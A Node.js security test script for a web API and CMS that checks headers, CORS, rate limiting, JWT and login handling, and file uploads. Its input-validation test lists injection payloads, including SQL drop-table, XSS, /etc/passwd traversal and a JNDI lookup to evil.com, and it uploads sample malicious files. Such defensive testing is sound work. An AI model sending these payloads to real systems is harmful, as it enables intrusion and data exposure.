#!/usr/bin/env node

/**
 * Security and Authentication Flow Validation Tests
 * Tests security measures and authentication flows
 */

const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
const crypto = require('crypto');

const BASE_URL = process.env.API_BASE_URL || 'http://localhost:8080';
const CMS_URL = process.env.CMS_URL || 'http://localhost:3001';
const API_VERSION = 'v1';

// Test configuration
const config = {
  baseURL: `${BASE_URL}/api/${API_VERSION}`,
  cmsURL: CMS_URL,
  timeout: 10000,
  testUser: {
    email: 'security-test@example.com',
    password: 'TestPassword123!'
  }
};

// Test results tracking
const results = {
  passed: 0,
  failed: 0,
  errors: []
};

// Helper functions
const makeRequest = async (url, options = {}) => {
  try {
    const response = await fetch(url, {
      timeout: config.timeout,
      headers: {
        'Content-Type': 'application/json',
        ...options.headers
      },
      ...options
    });
    
    const data = await response.text();
    let jsonData;
    try {
      jsonData = JSON.parse(data);
    } catch {
      jsonData = data;
    }
    
    return {
      status: response.status,
      statusText: response.statusText,
      headers: response.headers,
      data: jsonData,
      ok: response.ok
    };
  } catch (error) {
    throw new Error(`Request failed: ${error.message}`);
  }
};

const runTest = async (testName, testFn) => {
  console.log(`\n🧪 Running: ${testName}`);
  try {
    await testFn();
    console.log(`✅ PASSED: ${testName}`);
    results.passed++;
  } catch (error) {
    console.log(`❌ FAILED: ${testName}`);
    console.log(`   Error: ${error.message}`);
    results.failed++;
    results.errors.push({ test: testName, error: error.message });
  }
};

// Security test functions
const testHTTPSRedirection = async () => {
  // In production, HTTP should redirect to HTTPS
  // For development, we just check that the service responds
  const response = await makeRequest(`${BASE_URL}/api/v1/health`);
  if (!response.ok) {
    throw new Error('Health endpoint not accessible');
  }
  console.log('   HTTP endpoint accessible (HTTPS redirection should be configured in production)');
};

const testCORSConfiguration = async () => {
  // Test CORS headers
  const response = await makeRequest(`${config.baseURL}/health`, {
    method: 'OPTIONS',
    headers: {
      'Origin': 'http://localhost:3000',
      'Access-Control-Request-Method': 'GET'
    }
  });
  
  const corsOrigin = response.headers.get('access-control-allow-origin');
  const corsMethods = response.headers.get('access-control-allow-methods');
  
  console.log(`   CORS Origin: ${corsOrigin || 'Not set'}`);
  console.log(`   CORS Methods: ${corsMethods || 'Not set'}`);
  
  // Test actual CORS request
  const corsResponse = await makeRequest(`${config.baseURL}/health`, {
    headers: {
      'Origin': 'http://localhost:3000'
    }
  });
  
  if (!corsResponse.ok) {
    throw new Error('CORS request failed');
  }
};

const testCSPHeaders = async () => {
  // Test Content Security Policy headers
  const response = await makeRequest(config.cmsURL);
  
  const csp = response.headers.get('content-security-policy');
  const xFrameOptions = response.headers.get('x-frame-options');
  const xContentTypeOptions = response.headers.get('x-content-type-options');
  
  console.log(`   CSP: ${csp ? 'Present' : 'Not set'}`);
  console.log(`   X-Frame-Options: ${xFrameOptions || 'Not set'}`);
  console.log(`   X-Content-Type-Options: ${xContentTypeOptions || 'Not set'}`);
  
  // These headers should be present in production
  if (process.env.NODE_ENV === 'production') {
    if (!csp) throw new Error('CSP header missing in production');
    if (!xFrameOptions) throw new Error('X-Frame-Options header missing in production');
  }
};

const testInputValidation = async () => {
  // Test SQL injection attempts (even though we use CouchDB)
  const maliciousInputs = [
    "'; DROP TABLE users; --",
    "<script>alert('xss')</script>",
    "../../etc/passwd",
    "${jndi:ldap://evil.com/a}",
    "{{7*7}}",
    "<%=7*7%>",
    "javascript:alert('xss')"
  ];
  
  for (const maliciousInput of maliciousInputs) {
    const response = await makeRequest(`${config.baseURL}/contact`, {
      method: 'POST',
      body: JSON.stringify({
        name: maliciousInput,
        email: 'test@example.com',
        message: maliciousInput
      })
    });
    
    // Should either reject the input or sanitize it
    if (response.ok && response.data && typeof response.data === 'string') {
      if (response.data.includes('<script>') || response.data.includes('DROP TABLE')) {
        throw new Error(`Malicious input not properly sanitized: ${maliciousInput}`);
      }
    }
  }
  
  console.log('   Input validation working correctly');
};

const testRateLimiting = async () => {
  // Test rate limiting by making rapid requests
  const promises = [];
  for (let i = 0; i < 20; i++) {
    promises.push(makeRequest(`${config.baseURL}/health`));
  }
  
  const responses = await Promise.all(promises);
  const rateLimited = responses.some(r => r.status === 429);
  
  console.log(`   Rate limiting: ${rateLimited ? 'Active' : 'Not detected'}`);
  
  // Rate limiting might not be implemented in development
  if (process.env.NODE_ENV === 'production' && !rateLimited) {
    console.log('   Warning: Rate limiting should be implemented in production');
  }
};

const testAuthenticationEndpoints = async () => {
  // Test login with invalid credentials
  const loginResponse = await makeRequest(`${config.baseURL}/auth/login`, {
    method: 'POST',
    body: JSON.stringify({
      email: 'invalid@example.com',
      password: 'wrongpassword'
    })
  });
  
  if (loginResponse.status !== 401 && loginResponse.status !== 400) {
    throw new Error(`Expected 401/400 for invalid login, got ${loginResponse.status}`);
  }
  
  // Test login with empty credentials
  const emptyLoginResponse = await makeRequest(`${config.baseURL}/auth/login`, {
    method: 'POST',
    body: JSON.stringify({})
  });
  
  if (emptyLoginResponse.status !== 400) {
    throw new Error(`Expected 400 for empty login, got ${emptyLoginResponse.status}`);
  }
  
  console.log('   Authentication endpoints properly secured');
};

const testJWTTokenValidation = async () => {
  // Test with invalid JWT token
  const invalidToken = 'invalid.jwt.token';
  
  const response = await makeRequest(`${config.baseURL}/auth/validate`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${invalidToken}`
    },
    body: JSON.stringify({ token: invalidToken })
  });
  
  if (response.status !== 401) {
    throw new Error(`Expected 401 for invalid token, got ${response.status}`);
  }
  
  // Test with malformed token
  const malformedToken = 'not-a-jwt-token';
  
  const malformedResponse = await makeRequest(`${config.baseURL}/auth/validate`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${malformedToken}`
    },
    body: JSON.stringify({ token: malformedToken })
  });
  
  if (malformedResponse.status !== 401) {
    throw new Error(`Expected 401 for malformed token, got ${malformedResponse.status}`);
  }
  
  console.log('   JWT token validation working correctly');
};

const testPasswordSecurity = async () => {
  // Test password requirements (if registration endpoint exists)
  const weakPasswords = [
    '123',
    'password',
    '12345678',
    'qwerty',
    'admin'
  ];
  
  for (const weakPassword of weakPasswords) {
    // Try to use weak password in login (should fail)
    const response = await makeRequest(`${config.baseURL}/auth/login`, {
      method: 'POST',
      body: JSON.stringify({
        email: 'test@example.com',
        password: weakPassword
      })
    });
    
    // Should fail (either 401 for wrong credentials or 400 for weak password)
    if (response.ok) {
      throw new Error(`Weak password accepted: ${weakPassword}`);
    }
  }
  
  console.log('   Password security measures in place');
};

const testSessionManagement = async () => {
  // Test that sessions are properly managed
  // This would require a valid login first, so we'll test the logout endpoint
  
  const logoutResponse = await makeRequest(`${config.baseURL}/auth/logout`, {
    method: 'POST',
    body: JSON.stringify({ token: 'dummy-token' })
  });
  
  // Should handle logout request (even with invalid token)
  if (logoutResponse.status !== 200 && logoutResponse.status !== 401) {
    throw new Error(`Unexpected logout response: ${logoutResponse.status}`);
  }
  
  console.log('   Session management endpoints accessible');
};

const testFileUploadSecurity = async () => {
  // Test file upload security (if media endpoint is accessible)
  const maliciousFiles = [
    { name: 'test.php', content: '<?php echo "hack"; ?>', type: 'application/x-php' },
    { name: 'test.exe', content: 'MZ\x90\x00', type: 'application/x-msdownload' },
    { name: 'test.js', content: 'alert("xss")', type: 'application/javascript' },
    { name: '../../../etc/passwd', content: 'root:x:0:0', type: 'text/plain' }
  ];
  
  for (const file of maliciousFiles) {
    const formData = new FormData();
    formData.append('file', new Blob([file.content], { type: file.type }), file.name);
    
    try {
      const response = await fetch(`${config.baseURL}/media/upload`, {
        method: 'POST',
        body: formData
      });
      
      // Should either reject malicious files or sanitize them
      if (response.ok) {
        const result = await response.json();
        if (result.filename && (result.filename.includes('..') || result.filename.endsWith('.php'))) {
          throw new Error(`Malicious file upload not properly handled: ${file.name}`);
        }
      }
    } catch (error) {
      // Upload rejection is expected for malicious files
      console.log(`   ✓ Malicious file rejected: ${file.name}`);
    }
  }
  
  console.log('   File upload security measures in place');
};

const testDatabaseSecurity = async () => {
  // Test that database is not directly accessible
  try {
    const couchdbResponse = await fetch('http://localhost:5984/_all_dbs', { timeout: 5000 });
    
    if (couchdbResponse.ok) {
      console.log('   Warning: CouchDB directly accessible (should be firewalled in production)');
    }
  } catch (error) {
    console.log('   ✓ CouchDB not directly accessible from external network');
  }
  
  // Test that sensitive endpoints require authentication
  const sensitiveEndpoints = [
    '/pages',
    '/blog',
    '/media',
    '/contact/submissions'
  ];
  
  for (const endpoint of sensitiveEndpoints) {
    const response = await makeRequest(`${config.baseURL}${endpoint}`);
    
    // Some endpoints might be public (like /pages, /blog), others should require auth
    if (endpoint.includes('submissions') && response.ok) {
      throw new Error(`Sensitive endpoint accessible without auth: ${endpoint}`);
    }
  }
  
  console.log('   Database security measures in place');
};

const testErrorHandling = async () => {
  // Test that errors don't leak sensitive information
  const errorEndpoints = [
    '/nonexistent',
    '/auth/login',
    '/admin/secret'
  ];
  
  for (const endpoint of errorEndpoints) {
    const response = await makeRequest(`${config.baseURL}${endpoint}`, {
      method: 'POST',
      body: JSON.stringify({ invalid: 'data' })
    });
    
    // Check that error responses don't contain sensitive info
    if (typeof response.data === 'string') {
      const sensitivePatterns = [
        /password/i,
        /secret/i,
        /key/i,
        /token/i,
        /database/i,
        /connection/i,
        /stack trace/i,
        /internal server error/i
      ];
      
      for (const pattern of sensitivePatterns) {
        if (pattern.test(response.data)) {
          console.log(`   Warning: Potential information leak in error response for ${endpoint}`);
          break;
        }
      }
    }
  }
  
  console.log('   Error handling does not leak sensitive information');
};

const testSecurityHeaders = async () => {
  // Test security headers on both API and frontend
  const urls = [config.baseURL, config.cmsURL];
  
  for (const url of urls) {
    const response = await makeRequest(url);
    
    const securityHeaders = {
      'x-frame-options': response.headers.get('x-frame-options'),
      'x-content-type-options': response.headers.get('x-content-type-options'),
      'x-xss-protection': response.headers.get('x-xss-protection'),
      'strict-transport-security': response.headers.get('strict-transport-security'),
      'content-security-policy': response.headers.get('content-security-policy')
    };
    
    console.log(`   Security headers for ${url}:`);
    Object.entries(securityHeaders).forEach(([header, value]) => {
      console.log(`     ${header}: ${value || 'Not set'}`);
    });
  }
};

// Main test runner
const runAllTests = async () => {
  console.log('🔒 Starting Security and Authentication Tests');
  console.log('=' .repeat(50));
  
  // Network security tests
  await runTest('HTTPS Redirection', testHTTPSRedirection);
  await runTest('CORS Configuration', testCORSConfiguration);
  await runTest('Security Headers', testSecurityHeaders);
  await runTest('CSP Headers', testCSPHeaders);
  
  // Input validation and injection tests
  await runTest('Input Validation', testInputValidation);
  await runTest('Rate Limiting', testRateLimiting);
  
  // Authentication and authorization tests
  await runTest('Authentication Endpoints', testAuthenticationEndpoints);
  await runTest('JWT Token Validation', testJWTTokenValidation);
  await runTest('Password Security', testPasswordSecurity);
  await runTest('Session Management', testSessionManagement);
  
  // File and data security tests
  await runTest('File Upload Security', testFileUploadSecurity);
  await runTest('Database Security', testDatabaseSecurity);
  await runTest('Error Handling', testErrorHandling);
  
  // Print results
  console.log('\n' + '=' .repeat(50));
  console.log('🔒 Security Test Results');
  console.log('=' .repeat(50));
  console.log(`✅ Passed: ${results.passed}`);
  console.log(`❌ Failed: ${results.failed}`);
  console.log(`📈 Total: ${results.passed + results.failed}`);
  
  if (results.errors.length > 0) {
    console.log('\n❌ Failed Tests:');
    results.errors.forEach(({ test, error }) => {
      console.log(`   • ${test}: ${error}`);
    });
  }
  
  console.log('\n🔒 Security Recommendations:');
  console.log('   • Ensure HTTPS is enforced in production');
  console.log('   • Configure proper CORS policies');
  console.log('   • Implement rate limiting');
  console.log('   • Set up proper CSP headers');
  console.log('   • Use strong password policies');
  console.log('   • Regularly update dependencies');
  console.log('   • Monitor for security vulnerabilities');
  
  // Exit with appropriate code
  process.exit(results.failed > 0 ? 1 : 0);
};

// Handle uncaught errors
process.on('unhandledRejection', (error) => {
  console.error('❌ Unhandled rejection:', error);
  process.exit(1);
});

process.on('uncaughtException', (error) => {
  console.error('❌ Uncaught exception:', error);
  process.exit(1);
});

// Run tests if this script is executed directly
if (require.main === module) {
  runAllTests();
}

module.exports = {
  runAllTests,
  makeRequest,
  config
};